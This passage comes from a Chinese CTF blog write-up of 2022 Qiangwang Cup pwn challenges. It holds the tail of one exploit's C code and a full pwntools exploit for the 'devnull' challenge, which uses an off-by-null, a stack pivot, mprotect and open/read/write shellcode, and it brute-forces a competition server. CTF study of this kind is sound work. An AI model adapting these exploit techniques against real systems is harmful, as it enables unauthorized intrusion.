lotu153(<span class="number">153</span>);</span><br><span class="line">    lotu154(<span class="number">154</span>);</span><br><span class="line">    lotu155(<span class="number">155</span>);</span><br><span class="line">    lotu156(<span class="number">156</span>);</span><br><span class="line">    lotu157(<span class="number">157</span>);</span><br><span class="line">    lotu158(<span class="number">158</span>);</span><br><span class="line">    lotu159(<span class="number">159</span>);</span><br><span class="line">    lotu160(<span class="number">160</span>);</span><br><span class="line">    lotu161(<span class="number">161</span>);</span><br><span class="line">    lotu162(<span class="number">162</span>);</span><br><span class="line">    lotu163(<span class="number">163</span>);</span><br><span class="line">    lotu163(<span class="number">163</span>);</span><br><span class="line">    lotu164(<span class="number">164</span>);</span><br><span class="line">    lotu165(<span class="number">165</span>);</span><br><span class="line">    lotu166(<span class="number">166</span>);</span><br><span class="line">    lotu167(<span class="number">167</span>);</span><br><span class="line">    lotu168(<span class="number">168</span>);</span><br><span class="line">    lotu169(<span class="number">169</span>);</span><br><span class="line">    lotu170(<span class="number">170</span>);</span><br><span class="line">    lotu171(<span class="number">171</span>);</span><br><span class="line">    lotu172(<span class="number">172</span>);</span><br><span class="line">    lotu173(<span class="number">173</span>);</span><br><span class="line">    lotu174(<span class="number">174</span>);</span><br><span class="line">    lotu175(<span class="number">175</span>);</span><br><span class="line">    lotu176(<span class="number">176</span>);</span><br><span class="line">    lotu177(<span class="number">177</span>);</span><br><span class="line">    lotu178(<span class="number">178</span>);</span><br><span class="line">    lotu179(<span class="number">179</span>);</span><br><span class="line">    lotu180(<span class="number">180</span>);</span><br><span class="line">    lotu181(<span class="number">181</span>);</span><br><span class="line">    lotu182(<span class="number">182</span>);</span><br><span class="line">    lotu183(<span class="number">183</span>);</span><br><span class="line">    lotu184(<span class="number">184</span>);</span><br><span class="line">    lotu185(<span class="number">185</span>);</span><br><span class="line">    lotu186(<span class="number">186</span>);</span><br><span class="line">    lotu187(<span class="number">187</span>);</span><br><span class="line">    lotu188(<span class="number">188</span>);</span><br><span class="line">    lotu189(<span class="number">189</span>);</span><br><span class="line">    lotu190(<span class="number">190</span>);</span><br><span class="line">    lotu191(<span class="number">191</span>);</span><br><span class="line">    lotu192(<span class="number">192</span>);</span><br><span class="line">    lotu193(<span class="number">193</span>);</span><br><span class="line">    lotu194(<span class="number">194</span>);</span><br><span class="line">    lotu195(<span class="number">195</span>);</span><br><span class="line">    lotu196(<span class="number">196</span>);</span><br><span class="line">    lotu197(<span class="number">197</span>);</span><br><span class="line">    lotu198(<span class="number">198</span>);</span><br><span class="line">    lotu199(<span class="number">199</span>);</span><br><span class="line">    lotu200(<span class="number">200</span>);</span><br><span class="line">    lotu201(<span class="number">201</span>);</span><br><span class="line">    lotu202(<span class="number">202</span>);</span><br><span class="line">    lotu203(<span class="number">203</span>);</span><br><span class="line">    lotu204(<span class="number">204</span>);</span><br><span class="line">    lotu205(<span class="number">205</span>);</span><br><span class="line">    lotu206(<span class="number">206</span>);</span><br><span class="line">    lotu207(<span class="number">207</span>);</span><br><span class="line">    lotu208(<span class="number">208</span>);</span><br><span class="line">    lotu209(<span class="number">209</span>);</span><br><span class="line">    lotu210(<span class="number">210</span>);</span><br><span class="line">    lotu211(<span class="number">211</span>);</span><br><span class="line">    lotu212(<span class="number">212</span>);</span><br><span class="line">    lotu213(<span class="number">213</span>);</span><br><span class="line">    lotu214(<span class="number">214</span>);</span><br><span class="line">    lotu215(<span class="number">215</span>);</span><br><span class="line">    lotu216(<span class="number">216</span>);</span><br><span class="line">    lotu217(<span class="number">217</span>);</span><br><span class="line">    lotu218(<span class="number">218</span>);</span><br><span class="line">    lotu219(<span class="number">219</span>);</span><br><span class="line">    lotu220(<span class="number">220</span>);</span><br><span class="line">    lotu221(<span class="number">221</span>);</span><br><span class="line">    lotu222(<span class="number">222</span>);</span><br><span class="line">    lotu223(<span class="number">223</span>);</span><br><span class="line">    lotu224(<span class="number">224</span>);</span><br><span class="line">    lotu225(<span class="number">225</span>);</span><br><span class="line">    lotu226(<span class="number">226</span>);</span><br><span class="line">    lotu227(<span class="number">227</span>);</span><br><span class="line">    lotu228(<span class="number">228</span>);</span><br><span class="line">    lotu229(<span class="number">229</span>);</span><br><span class="line">    lotu230(<span class="number">230</span>);</span><br><span class="line">    lotu231(<span class="number">231</span>);</span><br><span class="line">    lotu232(<span class="number">232</span>);</span><br><span class="line">    lotu233(<span class="number">233</span>);</span><br><span class="line">    lotu234(<span class="number">234</span>);</span><br><span class="line">    lotu235(<span class="number">235</span>);</span><br><span class="line">    lotu236(<span class="number">236</span>);</span><br><span class="line">    lotu237(<span class="number">237</span>);</span><br><span class="line">    lotu238(<span class="number">238</span>);</span><br><span class="line">    lotu239(<span class="number">239</span>);</span><br><span class="line">    lotu240(<span class="number">0</span>);</span><br><span class="line">    lotu241(<span class="number">241</span>);</span><br><span class="line">    lotu242(<span class="number">242</span>);</span><br><span class="line">    lotu243(<span class="number">243</span>);</span><br><span class="line">    lotu244(<span class="number">244</span>);</span><br><span class="line">    lotu245(<span class="number">245</span>);</span><br><span class="line">    lotu246(<span class="number">246</span>);</span><br><span class="line">    lotu247(<span class="number">247</span>);</span><br><span class="line">    lotu248(<span class="number">248</span>);</span><br><span class="line">    lotu249(<span class="number">249</span>);</span><br><span class="line">    lotu250(<span class="number">250</span>);</span><br><span class="line">    lotu251(<span class="number">251</span>);</span><br><span class="line">    lotu252(<span class="number">252</span>);</span><br><span class="line">    lotu253(<span class="number">253</span>);</span><br><span class="line">    lotu254(<span class="number">254</span>);</span><br><span class="line">    lotu255(<span class="number">255</span>);</span><br><span class="line">    lotu85(<span class="number">0xcd</span>);  </span><br><span class="line">    lotu78(<span class="number">0xad</span>);</span><br><span class="line">    lotu79(<span class="number">0xfd</span>);</span><br><span class="line">    lotu8(<span class="number">0x6e</span>);</span><br><span class="line">    lotu80(<span class="number">0</span>);</span><br><span class="line">    lotu81(<span class="number">0</span>);</span><br><span class="line">    lotu82(<span class="number">0</span>);</span><br><span class="line">    lotu83(<span class="number">0</span>);</span><br><span class="line">    lotu84(<span class="number">0</span>);</span><br><span class="line">    fight(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="强网先锋"><a class="markdownIt-Anchor" href="#强网先锋">#</a> 强网先锋</h1>
<h3 id="challenge-devnull"><a class="markdownIt-Anchor" href="#challenge-devnull">#</a> challenge  devnull</h3>
<p><img data-src="https://tva3.sinaimg.cn/large/008qDYGVly1h4sc6p05sqj30el09xjw5.jpg" alt="3ce54a78-e9a2-4dd5-a12c-0b8f2a2239ea"></p>
<p>fgets 长度刚好合适，但是 fgets 会自动添加一个 \x00。所以有 off by null 可以修改 fd。</p>
<p>所以接下来为 read (0,v3,0x2c)。</p>
<p>可以覆盖栈上的 buf 指针以及 rbp,rip。</p>
<p>第一时间考虑栈迁移，不过这道题动用 mprotect 改了所写页的权限为 1，因此不可读。</p>
<p>看看周围唯一可读的就是堆地址。那就爆破。</p>
<p>知道往哪栈迁移之后，我们需要明确栈迁移之后能做什么。首先 close (1)+mprotect 设置页表权限让我们重回代码段不可行。所以栈迁移得一次到位。并且 close (1) 后并不好泄露 libc 基址。</p>
<p>同时程序没开启 pie 保护因此可以利用程序中自带的函数，第一时间想到用 mprotect 改权限然后 shellcode。同时发现栈迁移完 rdx 为 7，直接上 mprotect!</p>
<p>因为 gadget 比较少，用程序自带的原生 shellcode。</p>
<p><img data-src="https://tva4.sinaimg.cn/large/008qDYGVly1h4sc6ulc55j30nm04bgom.jpg" alt="4a413475-ec56-40b8-acf4-b2347cd7ef9f"></p>
<p>从这里开始可以控制 rsi，但是 rdi 和 rax 关联。</p>
<p>去找 gadget：有一条很好用：</p>
<p><img data-src="https://tvax3.sinaimg.cn/large/008qDYGVly1h4sc6ycribj30hl00ygmf.jpg" alt="337420a7-7ae3-4f06-8107-3d4f62a6cfe6"></p>
<p>用这条控制 rdx 即可。</p>
<p>然后就是 shellcode 调用新的 read，然后 orw，write fd 用 stderr 的 2 即可（这里 read 的 rsi 需要离远一点，不然会崩溃）本来打算直接 getshell 之后用 exec 1&amp;&gt;0 来重定向的，不过不知道为什么这样不可行。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> TRUE</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;/mnt/hgfs/ubuntu/qwb/1/devnull&#x27;)</span></span><br><span class="line"><span class="comment"># r = remote(&#x27;123.56.86.227&#x27;,20712)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/qwb/1/devnull&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;please input your filename\n&quot;</span>)</span><br><span class="line">    r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Please write the data you want to discard\n&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(r,&#x27;b mprotect&#x27;)</span></span><br><span class="line">    leave_ret = <span class="number">0x0000000000401354</span></span><br><span class="line"></span><br><span class="line">    gadget =  <span class="number">0x0000000000401351</span></span><br><span class="line">    <span class="comment">#0x0000000000401351 : mov eax, dword ptr [rbp - 0x18] ; leave ; ret</span></span><br><span class="line">    mprotect_addr = <span class="number">0x4012D0</span></span><br><span class="line">    heap_addr = <span class="number">0xa06000</span></span><br><span class="line">    r.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span>-<span class="number">8</span>)+p64(heap_addr)+p64(heap_addr)+p64(leave_ret))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;please input your new data\n&quot;</span>)</span><br><span class="line">    rop_chain=[</span><br><span class="line">    heap_addr+<span class="number">0x28</span>,</span><br><span class="line">    gadget,</span><br><span class="line">    heap_addr,</span><br><span class="line">    heap_addr,</span><br><span class="line">    <span class="string">b&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    heap_addr,</span><br><span class="line">    mprotect_addr,</span><br><span class="line">    heap_addr,</span><br><span class="line">    heap_addr+<span class="number">0x48</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shellcode = &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#     mov rdi,0x3fd020</span></span><br><span class="line">    <span class="comment">#     xor esi, esi               # rsi低32位</span></span><br><span class="line">    <span class="comment">#     xor edx, edx               # rdx低32位</span></span><br><span class="line">    <span class="comment">#     push 0x3b</span></span><br><span class="line">    <span class="comment">#     pop rax</span></span><br><span class="line">    <span class="comment">#     syscall</span></span><br><span class="line">    <span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rsi,rbp</span></span><br><span class="line"><span class="string">        add rsi,0x500</span></span><br><span class="line"><span class="string">        xor rdi,rdi</span></span><br><span class="line"><span class="string">        mov rdx,0x100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        jmp rsi</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    orw  = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">    orw+= shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">    orw+= shellcraft.write(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(asm(shellcode))))</span><br><span class="line">    <span class="comment"># shellcode = asm(shellcode)</span></span><br><span class="line">    <span class="comment"># shellcode = asm(shellcraft.sh()).ljust(0x18,b&#x27;\0&#x27;)</span></span><br><span class="line">    payload = flat(rop_chain)+asm(shellcode)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># print(hex(len(asm(orw))))</span></span><br><span class="line">    r.send(asm(orw))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> TRUE:</span><br><span class="line">    <span class="comment"># r = process(&#x27;/mnt/hgfs/ubuntu/qwb/1/devnull&#x27;)</span></span><br><span class="line">    r = remote(<span class="string">&#x27;47.94.166.51&#x27;</span>,<span class="number">22861</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
      <div class="tags">
          <a href="/tags/wp/" rel="tag"><i class="ic i-tag"></i> wp</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2023-01-14 15:13:08" itemprop="dateModified" datetime="2023-01-14T15:13:08+08:00">2023-01-14</time>
  </span>
  <span id="2022/08/03/2022qwb/" class="item leancloud_visitors" data-flag-title="2022强网杯pwn部分wp" title="阅读次数">
      <span class="icon">
        <i class="ic i-eye"></i>
      </span>
      <span class="text">阅读次数</span>
      <span class="leancloud-visitors-count"></span>
      <span class="text">次</span>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="Loτυs 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="Loτυs 支付宝">
        <p>支付宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>Loτυs <i class="ic i-at"><em>@</em></i>清風微醺
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="https://www.wdqjxtmph.top/2022/08/03/2022qwb/" title="2022强网杯pwn部分wp">https://www.wdqjxtmph.top/2022/08/03/2022qwb/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/07/24/DASCTF7%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9Bpwn%20wp/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63c2566dbe43e0d30e002884.webp" title="DASCTF7月赋能赛pwn wp">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> CTF</span>
  <h3>DASCTF7月赋能赛pwn wp</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63c25796be43e0d30e0244b8.webp" title="2022巅峰极客pwn wp">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> CTF</span>
  <h3>2022巅峰极客pwn wp</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.</span> <span class="toc-text"> Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge-usermanager"><span class="toc-number">1.1.</span> <span class="toc-text"> challenge UserManager</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge-houseofcat"><span class="toc-number">1.2.</span> <span class="toc-text"> challenge houseofcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge-yakagame"><span class="toc-number">1.3.</span> <span class="toc-text"> challenge yakagame</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B"><span class="toc-number"></span> <span class="toc-text"> 强网先锋</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge-devnull"><span class="toc-number">0.1.</span> <span class="toc-text"> challenge  devnull</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li><a href="/2021/08/20/string/" rel="bookmark" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></li><li><a href="/2021/09/03/babyrop/" rel="bookmark" title="标准32位程序ROP流程和c语言转义字符">标准32位程序ROP流程和c语言转义字符</a></li><li><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="bookmark" title="LibcSearcher环境配置和ubuntu更新换源问题">LibcSearcher环境配置和ubuntu更新换源问题</a></li><li><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" rel="bookmark" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></li><li><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" rel="bookmark" title="电科新生赛">电科新生赛</a></li><li><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" rel="bookmark" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></li><li><a href="/2021/11/29/SCU%E6%96%B0%E7%94%9F%E8%B5%9B2021/" rel="bookmark" title="SCU新生赛2021 pwn wp">SCU新生赛2021 pwn wp</a></li><li><a href="/2022/02/02/%E5%88%A9%E7%94%A8realloc%E8%B0%83%E6%95%B4%E6%A0%88%E4%BD%BFone_gadget%E7%94%9F%E6%95%88/" rel="bookmark" title="利用realloc调整栈使one_gadget生效">利用realloc调整栈使one_gadget生效</a></li><li><a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" rel="bookmark" title="Tcachebin 总结">Tcachebin 总结</a></li><li><a href="/2022/04/06/wustctf2020_babyfmt/" rel="bookmark" title="wustctf2020_babyfmt">wustctf2020_babyfmt</a></li><li><a href="/2022/07/11/2022%E8%93%9D%E5%B8%BDpwn%20wp/" rel="bookmark" title="2022蓝帽pwn wp">2022蓝帽pwn wp</a></li><li><a href="/2022/07/15/DSCTF%E9%83%A8%E5%88%86wp/" rel="bookmark" title="DSCTF pwn 部分wp">DSCTF pwn 部分wp</a></li><li><a href="/2022/07/24/DASCTF7%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9Bpwn%20wp/" rel="bookmark" title="DASCTF7月赋能赛pwn wp">DASCTF7月赋能赛pwn wp</a></li><li class="active"><a href="/2022/08/03/2022qwb/" rel="bookmark" title="2022强网杯pwn部分wp">2022强网杯pwn部分wp</a></li><li><a href="/2022/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" rel="bookmark" title="2022巅峰极客pwn wp">2022巅峰极客pwn wp</a></li><li><a href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF/" rel="bookmark" title="羊城杯pwn wp">羊城杯pwn wp</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="Loτυs"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">Loτυs</p>
  <div class="description" itemprop="description">凌恒山其若陋兮、</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">19</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">3</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">6</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="/default/" rel="section"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>

</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/07/24/DASCTF7%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9Bpwn%20wp/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2022/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" title="2022巅峰极客pwn wp">2022巅峰极客pwn wp</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2021/08/20/string/" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="LibcSearcher环境配置和ubuntu更新换源问题">LibcSearcher环境配置和ubuntu更新换源问题</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2022/04/06/wustctf2020_babyfmt/" title="wustctf2020_babyfmt">wustctf2020_babyfmt</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="分类于 学习笔记">学习笔记</a>
</div>

    <span><a href="/2021/10/24/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-chunk%20overlapping/" title="堆学习-Chunk Overlapping">堆学习-Chunk Overlapping</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2022/07/11/2022%E8%93%9D%E5%B8%BDpwn%20wp/" title="2022蓝帽pwn wp">2022蓝帽pwn wp</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="分类于 学习笔记">学习笔记</a>
</div>

    <span><a href="/2021/10/30/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-UAF/" title="堆学习-UAF">堆学习-UAF</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="分类于 CTF赛题复现">CTF赛题复现</a>
</div>

    <span><a href="/2022/12/01/hitcon-wtfshell/" title="hitcon2022-wtfshell">hitcon2022-wtfshell</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
</div>

    <span><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" title="电科新生赛">电科新生赛</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Loτυs @ Loτυs</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/08/03/2022qwb/',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
